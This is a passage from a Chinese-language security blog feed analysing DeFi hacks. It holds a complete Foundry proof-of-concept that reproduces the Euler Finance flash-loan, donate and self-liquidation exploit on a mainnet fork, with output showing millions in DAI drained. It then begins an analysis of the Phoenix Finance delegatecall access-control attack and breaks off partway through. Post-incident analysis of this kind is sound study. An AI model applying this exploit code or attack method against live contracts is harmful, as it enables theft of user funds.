noreferrer&#34;&gt;https://etherscan.io/tx/0xc310a0affe2169d1f6feec1c63dbc7f7c62a887fa48795d327d4d2da2d6b111d&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;相比于我上面的POC，下面的模拟黑客攻击的代码有几点不同&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;黑客没有花自己的钱去抵押，而是使用的AaveV2闪电贷的贷款进行的攻击&lt;/li&gt;&#xA;&lt;li&gt;为了最大化获利，制造更大的坏账， 黑客两次调用了mint函数， 在第二次调用mint之前还了一部分款是为了增加自己的财务健康度，以便完成第二次贷款&lt;/li&gt;&#xA;&lt;li&gt;黑客的清算者没有平账（没有还钱），也没必要平账，完成清算后其eDAI数量远远大于dDAI数量。比如你有100 eDAI, 20的dDAI, 有80盈余，withdraw部分盈余自然不需要平账&lt;/li&gt;&#xA;&lt;li&gt;黑客的清算者的eDAI数量和dDAI数量的差额远远大于平台上DAI的总量，所以withdraw的时候数量用的是平台的全部额度 eDAI.withdraw(&lt;em&gt;0&lt;/em&gt;, &lt;em&gt;DAI&lt;/em&gt;.balanceOf(EulerLiquidation));&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;// SPDX-License-Identifier: SEE LICENSE IN LICENSE&#xA;pragma solidity ^0.8.10;&#xA;&#xA;import &amp;#34;forge-std/Test.sol&amp;#34;;&#xA;&#xA;// &amp;lt;https://docs.euler.finance/developers/getting-started/contract-reference#ieuleretoken&amp;gt;&#xA;interface EToken {&#xA;    //将底层代币从发送者转移到 Euler 池中，并增加账户的 eToken&#xA;    function deposit(uint256 subAccountId, uint256 amount) external;&#xA;&#xA;    //铸造 eToken 和相应数量的 dTokens（“自借”）&#xA;    function mint(uint256 subAccountId, uint256 amount) external;&#xA;&#xA;    //销毁 eToken 和相应数量的 dTokens （“自还”）&#xA;    function burn(uint subAccountId, uint amount) external;&#xA;&#xA;    //向储备金捐赠代币&#xA;    function donateToReserves(uint256 subAccountId, uint256 amount) external;&#xA;&#xA;    //将底层代币从 Euler 池中转移到发送方，并减少账户的 eTokens&#xA;    function withdraw(uint256 subAccountId, uint256 amount) external;&#xA;&#xA;    function balanceOf(address account) external view returns (uint);&#xA;&#xA;    function balanceOfUnderlying(address account) external view returns (uint);&#xA;&#xA;    function transfer(address to, uint amount) external returns (bool);&#xA;}&#xA;&#xA;//https://docs.euler.finance/developers/getting-started/contract-reference#ieulerdtoken&#xA;interface DToken {&#xA;    function repay(uint256 subAccountId, uint256 amount) external;&#xA;&#xA;    function balanceOf(address account) external view returns (uint);&#xA;}&#xA;&#xA;interface IEuler {&#xA;    //清算机会&#xA;    struct LiquidationOpportunity {&#xA;        //清算金额&#xA;        uint256 repay;&#xA;        //收益&#xA;        uint256 yield;&#xA;        //健康分数&#xA;        uint256 healthScore;&#xA;        //基础折扣&#xA;        uint256 baseDiscount;&#xA;        //折扣&#xA;        uint256 discount;&#xA;        //转换率&#xA;        uint256 conversionRate;&#xA;    }&#xA;&#xA;    function liquidate(&#xA;        //清算者&#xA;        address violator,&#xA;        //底层代币(将要偿还的代币)&#xA;        address underlying,&#xA;        //抵押代币&#xA;        address collateral,&#xA;        //违规者要转给sender的基础DToken的数量，单位为基础代币。&#xA;        uint256 repay,&#xA;        //违规者要转给sender的EToken的最低可接受数量&#xA;        uint256 minYield&#xA;    ) external;&#xA;&#xA;    //检查清算机会&#xA;    function checkLiquidation(&#xA;        //清算者&#xA;        address liquidator,&#xA;        //违规者&#xA;        address violator,&#xA;        //底层代币(将要偿还的代币)&#xA;        address underlying,&#xA;        //抵押代币&#xA;        address collateral&#xA;    ) external returns (LiquidationOpportunity memory liqOpp);&#xA;}&#xA;&#xA;interface IERC20 {&#xA;    function approve(address spender, uint256 amount) external returns (bool);&#xA;&#xA;    function balanceOf(address) external view returns (uint256);&#xA;&#xA;    function decimals() external view returns (uint8);&#xA;&#xA;    function transfer(&#xA;        address recipient,&#xA;        uint256 amount&#xA;    ) external returns (bool);&#xA;}&#xA;&#xA;// &amp;lt;https://docs.aave.com/developers/core-contracts/pool#flashloan&amp;gt;&#xA;interface IAaveFlashloan {&#xA;    function flashLoan(&#xA;        address receiver,&#xA;        address[] calldata assets,&#xA;        uint256[] calldata amounts,&#xA;        uint256[] calldata modes,&#xA;        address onBehalfOf,&#xA;        bytes calldata params,&#xA;        uint16 referralCode&#xA;    ) external;&#xA;}&#xA;&#xA;// &amp;lt;https://docs.euler.finance/euler-protocol/addresses#mainnet&amp;gt;&#xA;IEuler constant Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);&#xA;address constant EulerLiquidation = 0x27182842E098f60e3D576794A5bFFb0777E025d3;&#xA;IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);&#xA;EToken constant eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);&#xA;DToken constant dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);&#xA;IAaveFlashloan constant AaveV2 = IAaveFlashloan(&#xA;    0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9&#xA;);&#xA;&#xA;contract Violator {&#xA;    function DoSometingEvil() external {&#xA;        DAI.approve(EulerLiquidation, type(uint256).max);&#xA;&#xA;        //将借款来的3000万DAI中的2000万DAI存入Euler池，&#xA;        //并获得1950万的eDAI&#xA;        eDAI.deposit(0, 20_000_000 * 1e18);&#xA;        console2.log(&#xA;            &amp;#34;[Violator] eDAI balance after deposit DAI: &amp;#34;,&#xA;            eDAI.balanceOf(address(this)) / 1e18&#xA;        );&#xA;&#xA;        //铸造2亿eDAI (获得2亿dDAI，即欠款2亿)&#xA;        eDAI.mint(0, 200_000_000 * 1e18);&#xA;&#xA;        console2.log(&#xA;            &amp;#34;[Violator] eDAI balance after eDAI.mint: &amp;#34;,&#xA;            eDAI.balanceOf(address(this)) / 1e18&#xA;        );&#xA;        console2.log(&#xA;            &amp;#34;[Violator] dDAI balance after eDAI.mint: &amp;#34;,&#xA;            dDAI.balanceOf(address(this)) / 1e18&#xA;        );&#xA;        //使用DAI去还款1000万，此时贷款的3000万DAI被花光&#xA;        //还拥有1.9亿dDAI，即欠款1.9亿&#xA;        dDAI.repay(0, 10_000_000 * 1e18);&#xA;&#xA;        console2.log(&#xA;            &amp;#34;[Violator] dDAI balance after dDAI.repay: &amp;#34;,&#xA;            dDAI.balanceOf(address(this)) / 1e18&#xA;        );&#xA;        console2.log(&#xA;            &amp;#34;[Violator] eDAI balance after dDAI.repay: &amp;#34;,&#xA;            eDAI.balanceOf(address(this)) / 1e18&#xA;        );&#xA;        console2.log(&#xA;            &amp;#34;[Violator] DAI balance after eDAI.mint: &amp;#34;,&#xA;            DAI.balanceOf(address(this)) / 1e18&#xA;        );&#xA;        //再铸造2亿eDAI (获得2亿dDAI，即欠款2亿)&#xA;        //此时拥有dDAI 3.9亿, 即欠款3.9亿&#xA;        //此时拥有eDAI 4.1亿多，含2次的2亿铸造以及通过eDAI.deposit获得的&#xA;        eDAI.mint(0, 200_000_000 * 1e18);&#xA;        console2.log(&#xA;            &amp;#34;[Violator] eDAI balance after eDAI.mint(2): &amp;#34;,&#xA;            eDAI.balanceOf(address(this)) / 1e18&#xA;        );&#xA;        console2.log(&#xA;            &amp;#34;[Violator] dDAI balance after eDAI.mint(2): &amp;#34;,&#xA;            dDAI.balanceOf(address(this)) / 1e18&#xA;        );&#xA;&#xA;        //捐献1亿的eDAI给Euler池&#xA;        //此时拥有dDAI 3.9亿, 即欠款3.9亿&#xA;        //此时拥有eDAI 3.1亿多，&#xA;        eDAI.donateToReserves(0, 100_000_000 * 1e18);&#xA;&#xA;        console2.log(&#xA;            &amp;#34;[Violator] eDAI balance after donateToReserves: &amp;#34;,&#xA;            eDAI.balanceOf(address(this)) / 1e18&#xA;        );&#xA;        console2.log(&#xA;            &amp;#34;[Violator] dDAI balance after donateToReserves: &amp;#34;,&#xA;            dDAI.balanceOf(address(this)) / 1e18&#xA;        );&#xA;        console2.log(&#xA;            &amp;#34;[Violator] DAI balance after donateToReserves: &amp;#34;,&#xA;            DAI.balanceOf(address(this)) / 1e18&#xA;        );&#xA;    }&#xA;}&#xA;&#xA;contract Liquidator is Test {&#xA;    function checkHealth(address _who) private {&#xA;        //第一个参数是清算者地址， 不能传自己，否则会报错： [FAIL. Reason: e/liq/self-liquidation]&#xA;        IEuler.LiquidationOpportunity memory returnData = Euler&#xA;            .checkLiquidation(address(0), _who, address(DAI), address(DAI));&#xA;&#xA;        emit log_named_decimal_uint(&amp;#34;healthScore&amp;#34;, returnData.healthScore, 18);&#xA;    }&#xA;&#xA;    function liquidate(address liquidator, address violator) external {&#xA;        // 清算前，Liquidator没有eDAI,也没有dDAI&#xA;        console2.log(&#xA;            &amp;#34;[Liquidator] eDAI balance before liquidate: &amp;#34;,&#xA;            eDAI.balanceOf(address(this)) / 1e18&#xA;        );&#xA;        console2.log(&#xA;            &amp;#34;[Liquidator] dDAI balance after liquidate: &amp;#34;,&#xA;            dDAI.balanceOf(address(this)) / 1e18&#xA;        );&#xA;&#xA;        // 计算清算机会&#xA;        IEuler.LiquidationOpportunity memory returnData = Euler&#xA;            .checkLiquidation(liquidator, violator, address(DAI), address(DAI));&#xA;&#xA;        console2.log(&#xA;            &amp;#34;[Liquidator] checkLiquidation, repay: &amp;#34;,&#xA;            returnData.repay / 1e18&#xA;        );&#xA;        console2.log(&#xA;            &amp;#34;[Liquidator] checkLiquidation, yield: &amp;#34;,&#xA;            returnData.yield / 1e18&#xA;        );&#xA;        console2.log(&#xA;            &amp;#34;[Liquidator] checkLiquidation, healthScore: &amp;#34;,&#xA;            returnData.healthScore&#xA;        );&#xA;        console2.log(&#xA;            &amp;#34;[Liquidator] checkLiquidation, baseDiscount: &amp;#34;,&#xA;            returnData.baseDiscount&#xA;        );&#xA;        console2.log(&#xA;            &amp;#34;[Liquidator] checkLiquidation, discount: &amp;#34;,&#xA;            returnData.discount&#xA;        );&#xA;        console2.log(&#xA;            &amp;#34;[Liquidator] checkLiquidation, conversionRate: &amp;#34;,&#xA;            returnData.conversionRate&#xA;        );&#xA;&#xA;        // 清算&#xA;        Euler.liquidate(&#xA;            violator,&#xA;            address(DAI),&#xA;            address(DAI),&#xA;            returnData.repay,&#xA;            returnData.yield&#xA;        );&#xA;&#xA;        //清算后， 违规者的eDAI被转移给清算者&#xA;        console2.log(&#xA;            &amp;#34;[Liquidator] eDAI balance after liquidate: &amp;#34;,&#xA;            eDAI.balanceOf(address(this)) / 1e18&#xA;        );&#xA;        // 清算后， 违规者的dDAI（负债）也被转移给清算者（负债会按照打折价格转移给清算者）&#xA;        console2.log(&#xA;            &amp;#34;[Liquidator] dDAI balance after liquidate: &amp;#34;,&#xA;            dDAI.balanceOf(address(this)) / 1e18&#xA;        );&#xA;&#xA;        // 清算后，EulerLiquidation的DAI余额大概3800多万&#xA;        console2.log(&#xA;            &amp;#34;[Liquidator] DAI balance of EulerLiquidation after liquidate: &amp;#34;,&#xA;            DAI.balanceOf(EulerLiquidation) / 1e18&#xA;        );&#xA;&#xA;        checkHealth(address(this));&#xA;&#xA;        // 提现，由于清算者此时有约2亿6千万eDAI, EulerLiquidation只有3800多万的DAI，根本不够兑换&#xA;        // 所以使用的是EulerLiquidation的最大值&#xA;        eDAI.withdraw(0, DAI.balanceOf(EulerLiquidation));&#xA;        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));&#xA;&#xA;        //还有很多eDAI没有提取出来&#xA;        console2.log(&#xA;            &amp;#34;[Liquidator] eDAI balance after withdraw: &amp;#34;,&#xA;            eDAI.balanceOf(address(this)) / 1e18&#xA;        );&#xA;&#xA;        console2.log(&#xA;            &amp;#34;[Liquidator] dDAI balance after withdraw: &amp;#34;,&#xA;            dDAI.balanceOf(address(liquidator)) / 1e18&#xA;        );&#xA;&#xA;        checkHealth(address(this));&#xA;    }&#xA;}&#xA;&#xA;contract POC is Test {&#xA;    Violator violator;&#xA;    Liquidator liquidator;&#xA;&#xA;    function setUp() public {&#xA;        vm.createSelectFork(&amp;#34;mainnet&amp;#34;, 16_817_995);&#xA;        vm.label(address(DAI), &amp;#34;DAI&amp;#34;);&#xA;        vm.label(address(eDAI), &amp;#34;eDAI&amp;#34;);&#xA;        vm.label(address(dDAI), &amp;#34;dDAI&amp;#34;);&#xA;        vm.label(address(AaveV2), &amp;#34;AaveV2&amp;#34;);&#xA;        vm.label(0xC6845a5C768BF8D7681249f8927877Efda425baf, &amp;#34;LogicOfAaveV2&amp;#34;);&#xA;        vm.label(address(Euler), &amp;#34;Euler&amp;#34;);&#xA;        vm.label(address(EulerLiquidation), &amp;#34;EulerLiquidation&amp;#34;);&#xA;    }&#xA;&#xA;    function testExploit() public {&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[POC] DAI balance after exploit&amp;#34;,&#xA;            DAI.balanceOf(address(this)),&#xA;            DAI.decimals()&#xA;        );&#xA;&#xA;        // 从AaveV2贷款3000万的DAI&#xA;        uint256 aaveFlashLoanAmount = 30000000 * 1e18;&#xA;        address[] memory assets = new address[](1);&#xA;        assets[0] = address(DAI);&#xA;        uint256[] memory amounts = new uint256[](1);&#xA;        amounts[0] = aaveFlashLoanAmount;&#xA;        uint256[] memory modes = new uint[](1);&#xA;        modes[0] = 0;&#xA;        bytes memory params = abi.encode();&#xA;&#xA;        AaveV2.flashLoan(&#xA;            address(this), // receiver: the address that will receive the flash loan&#xA;            assets, // assets: an array of asset addresses to be borrowed&#xA;            amounts, // amounts: an array of amounts to be borrowed for each asset&#xA;            modes, // modes: an array of modes (0 = no debt, 1 = stable, 2 = variable) for each asset&#xA;            address(this), // onBehalfOf: the address on behalf of which the action is executed&#xA;            params, // params: additional data to be passed to the receiver&#xA;            0 // referralCode: referral code to be used for the flash loan&#xA;        );&#xA;&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[POC] DAI balance after exploit&amp;#34;,&#xA;            DAI.balanceOf(address(this)),&#xA;            DAI.decimals()&#xA;        );&#xA;    }&#xA;&#xA;    function executeOperation(&#xA;        address[] calldata,&#xA;        uint256[] calldata,&#xA;        uint256[] calldata,&#xA;        address,&#xA;        bytes calldata&#xA;    ) external returns (bool) {&#xA;        violator = new Violator();&#xA;        liquidator = new Liquidator();&#xA;        //将贷款得到的3000万DAI转交给违规者&#xA;        DAI.transfer(address(violator), DAI.balanceOf(address(this)));&#xA;        //违规者做一些恶意操作&#xA;        violator.DoSometingEvil();&#xA;&#xA;        //清算者清算违规者&#xA;        liquidator.liquidate(address(liquidator), address(violator));&#xA;&#xA;        //从Eluer的获利数（不是净获利，还要还闪电贷的贷款3000多万）&#xA;        emit log_named_decimal_uint(&#xA;            &amp;#34;[POC] DAI balance after liquidate (before payback the loan)&amp;#34;,&#xA;            DAI.balanceOf(address(this)),&#xA;            DAI.decimals()&#xA;        );&#xA;&#xA;        //归还贷款：&#xA;        // 批准AaveV2从当前合约扣除贷款本金和利息&#xA;        //执行完业务逻辑后，fAaveV2会调用DAI::transferFrom从当前合约扣除贷款本金和利息&#xA;        DAI.approve(address(AaveV2), type(uint256).max);&#xA;&#xA;        return true;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输出&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[PASS] testExploit() (gas: 2853352)&#xA;Logs:&#xA;  [POC] DAI balance after exploit: 0.000000000000000000&#xA;  [Violator] eDAI balance after deposit DAI:  19568124&#xA;  [Violator] eDAI balance after eDAI.mint:  215249368&#xA;  [Violator] dDAI balance after eDAI.mint:  200000000&#xA;  [Violator] dDAI balance after dDAI.repay:  190000000&#xA;  [Violator] eDAI balance after dDAI.repay:  215249368&#xA;  [Violator] DAI balance after eDAI.mint:  0&#xA;  [Violator] eDAI balance after eDAI.mint(2):  410930612&#xA;  [Violator] dDAI balance after eDAI.mint(2):  390000000&#xA;  [Violator] eDAI balance after donateToReserves:  310930612&#xA;  [Violator] dDAI balance after donateToReserves:  390000000&#xA;  [Violator] DAI balance after donateToReserves:  0&#xA;  [Liquidator] eDAI balance before liquidate:  0&#xA;  [Liquidator] dDAI balance after liquidate:  0&#xA;  [Liquidator] checkLiquidation, repay:  259319058&#xA;  [Liquidator] checkLiquidation, yield:  317792963&#xA;  [Liquidator] checkLiquidation, healthScore:  750978643164551262&#xA;  [Liquidator] checkLiquidation, baseDiscount:  269021356835448738&#xA;  [Liquidator] checkLiquidation, discount:  200000000000000000&#xA;  [Liquidator] checkLiquidation, conversionRate:  1250000000000000000&#xA;  [Liquidator] eDAI balance after liquidate:  310930612&#xA;  [Liquidator] dDAI balance after liquidate:  259319058&#xA;  [Liquidator] DAI balance of EulerLiquidation after liquidate:  38904507&#xA;  healthScore: 1.146929824561403508&#xA;  [Liquidator] eDAI balance after withdraw:  272866200&#xA;  [Liquidator] dDAI balance after withdraw:  259319058&#xA;  healthScore: 1.019408031754312432&#xA;  [POC] DAI balance after liquidate (before payback the loan): 38904507.348306697267428294&#xA;  [POC] DAI balance after exploit: 8877507.348306697267428294&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;贷款：3000万， 净利润： 8877507 美刀&lt;/p&gt;</description>
    </item>
    <item>
      <title>Phoenix 访问控制攻击分析</title>
      <link>https://yinhui1984.github.io/phoenix-access-control-attack/</link>
      <pubDate>Wed, 15 Mar 2023 14:50:48 +0800</pubDate>
      <guid>https://yinhui1984.github.io/phoenix-access-control-attack/</guid>
      <category domain="https://yinhui1984.github.io/categories/security/">Security</category>
      <description>&lt;p&gt;Phoenix Finance 的智能合约访问控制不严格导致的一次攻击&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;概述&#34;&gt;&lt;span&gt;概述&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e6%a6%82%e8%bf%b0&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://twitter.com/HypernativeLabs/status/1633090456157401088&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://twitter.com/HypernativeLabs/status/1633090456157401088&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;故事发生在 polygon 链上的 &lt;a href=&#34;https://polygonscan.com/block/40067323&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;40067323&lt;/a&gt; 高度&lt;/p&gt;&#xA;&lt;p&gt;tx: &lt;a href=&#34;https://polygonscan.com//tx/0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;攻击流程参考: &lt;a href=&#34;https://phalcon.xyz/tx/polygon/0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://phalcon.xyz/tx/polygon/0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;代码分析&#34;&gt;&lt;span&gt;代码分析&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Phoenix Finance 有一个代理合约 &lt;a href=&#34;https://polygonscan.com/address/0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de#code&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;对应的逻辑合约为 &lt;strong&gt;&lt;a href=&#34;https://polygonscan.com/address/0x6d68beb09ea7e76d561ea8c4aac34a6611dd9821#code&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;0x6d68beb09ea7e76d561ea8c4aac34a6611dd9821&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;逻辑合约中有这样一个&lt;code&gt;public&lt;/code&gt;函数叫做&lt;code&gt;delegateCallSwap&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;    function delegateCallSwap(bytes memory data) public returns (bytes memory) {&#xA;        (bool success, bytes memory returnData) = phxSwapLib.delegatecall(data);&#xA;        assembly {&#xA;            if eq(success, 0) {&#xA;                revert(add(returnData, 0x20), returndatasize)&#xA;            }&#xA;        }&#xA;        return returnData;&#xA;    }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中 &lt;code&gt;phxSwapLib&lt;/code&gt; 可以从&lt;a href=&#34;https://polygonscan.com/address/0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de#readProxyContract&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;代理合约&lt;/a&gt;上读出值为 : &lt;a href=&#34;https://polygonscan.com/address/0x95620f30263ac0b0b4ffd9b7465838084e89cb84#code&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;0x95620f30263ac0b0B4FFd9B7465838084e89cB84&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;它是一个&lt;code&gt;UniSwapRouter&lt;/code&gt; , 包含了一个&lt;code&gt;swap()&lt;/code&gt;函数,用于在指定的router上进行token swap&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;    function swap(address swapRouter,address token0,address token1,uint256 amountSell) payable external returns (uint256){&#xA;        return _swap(swapRouter,token0,token1,amountSell);&#xA;    }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;梳理一下便可以得到下面的逻辑&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;https://github.com/yinhui1984/imagehosting/blob/main/images/1678867288807757000.png?raw=true&#39; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;也就是说, 任何人都可以以代理合约(0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de)为上下文进行代币置换.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;那么, 如果我有很多自己的创建的ERC20代币(MYTOKEN), 并以该ERC20代币创建一个交易池(Uniwswap Pair)&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;并且如果刚好代理合约又很有钱&lt;/strong&gt;, 那么我就可以让代理合约用真金白银来置换我们不值钱的MYTOKEN, 代理合约的钱就将会被置换到我们的交易池中, 然后我们再用一堆不值钱的MYTOKEN从交易池中将代理合约刚刚置换MYTOKEN的钱置换出来. 钱就到我们手中了.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;可惜的是代理合约现在没钱(只有 0.000000000423个WETH)&lt;/p&gt;&#xA;&lt;p&gt;如何让代理合约有钱?&lt;/p&gt;&#xA;&lt;p&gt;在逻辑合约代码中有一个 &lt;code&gt;buyLeverage&lt;/code&gt;函数, 用于用户购买Leverage Token , 也就是&lt;a href=&#34;https://phalcon.xyz/tx/polygon/0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;攻击流程&lt;/a&gt;中看到的WETH_BULL_X3这个币&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;buyLeverage&lt;/code&gt;函数调用的&lt;code&gt;_buy&lt;/code&gt;函数如下&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;    function _buy(leverageInfo memory coinInfo,uint256 amount,uint256 minAmount,uint256 deadLine,bool bFirstToken) ensure(deadLine) notHalted nonReentrant getUnderlyingPrice internal{&#xA;        address inputToken;&#xA;        if(bFirstToken){&#xA;            inputToken = coinInfo.token;&#xA;        }else{&#xA;            inputToken = (coinInfo.id == 0) ? hedgeCoin.token : leverageCoin.token;&#xA;        }&#xA;        amount = getPayableAmount(inputToken,amount);&#xA;        require(amount &amp;gt; 0, &amp;#39;buy amount is zero&amp;#39;);&#xA;        uint256 userPay = amount;&#xA;        amount = redeemFees(buyFee,inputToken,amount);&#xA;        uint256 price = _tokenNetworthBuy(coinInfo,currentPrice);&#xA;        uint256 leverageAmount = bFirstToken ? amount.mul(calDecimal)/price :&#xA;            amount.mulPrice(currentPrice,coinInfo.id)/price;&#xA;        require(leverageAmount&amp;gt;=minAmount,&amp;#34;token amount is less than minAmount&amp;#34;);&#xA;        {&#xA;            uint256 userLoan = (leverageAmount.mul(coinInfo.rebalanceWorth)/calDecimal).mul(coinInfo.leverageRate-feeDecimal)/feeDecimal;&#xA;            userLoan = coinInfo.stakePool.borrow(userLoan);&#xA;            amount = bFirstToken ? userLoan.add(amount) : userLoan;&#xA;            //98%&#xA;            uint256 amountOut = amount.mul(98e16).divPrice(currentPrice,coinInfo.id);&#xA;            address token1 = (coinInfo.id == 0) ? hedgeCoin.token : leverageCoin.token;&#xA;            amount = _swap(coinInfo.token,token1,amount);&#xA;            require(amount&amp;gt;=amountOut, &amp;#34;swap slip page is more than 2%&amp;#34;);&#xA;        }&#xA;        coinInfo.leverageToken.mint(msg.sender,leverageAmount);&#xA;        price = price.mul(currentPrice[coinInfo.id])/calDecimal;&#xA;        if(coinInfo.id == 0){&#xA;            emit BuyLeverage(msg.sender,inputToken,userPay,leverageAmount,price);&#xA;        }else{&#xA;            emit BuyHedge(msg.sender,inputToken,userPay,leverageAmount,price);&#xA;        }  &#xA;    }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中&lt;code&gt;userLoan = coinInfo.stakePool.borrow(userLoan); &lt;/code&gt;该代码会向&lt;a href=&#34;https://polygonscan.com/address/0xd0289082cf4c5c2ba448b4b9c67232729aa75efa#readProxyContract&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;另外一个代理合约&lt;/a&gt;借钱到本代理合约. 我没搞清楚这是在干嘛. 但反正用户向代理合约购买Leverage Token后, 代理合约会得到两笔USDC: 用户付款的USDC以及调用coinInfo.stakePool.borrow()借来的USDC, 并且其会将这些USDC都转换为WETH&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;所以, 为了让代理合约有钱置换我们的币, 我们花&lt;code&gt;X&lt;/code&gt;向代理合约购买Leverage Token, 代理合约会收到的价值为 &lt;code&gt;X + Y&lt;/code&gt; , &lt;code&gt;Y&lt;/code&gt;是它向&lt;a href=&#34;https://polygonscan.com/address/0xd0289082cf4c5c2ba448b4b9c67232729aa75efa#readProxyContract&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;另外一个代理合约&lt;/a&gt;借来的&lt;/p&gt;&#xA;&lt;p&gt;然后我们让代理合约花  &lt;code&gt;X + Y&lt;/code&gt; 全部拿来置换我们的币, 这样除去成本&lt;code&gt;X&lt;/code&gt;, 我们能净赚&lt;code&gt;Y&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;在本次攻击中, 黑客也没想花自己的钱, 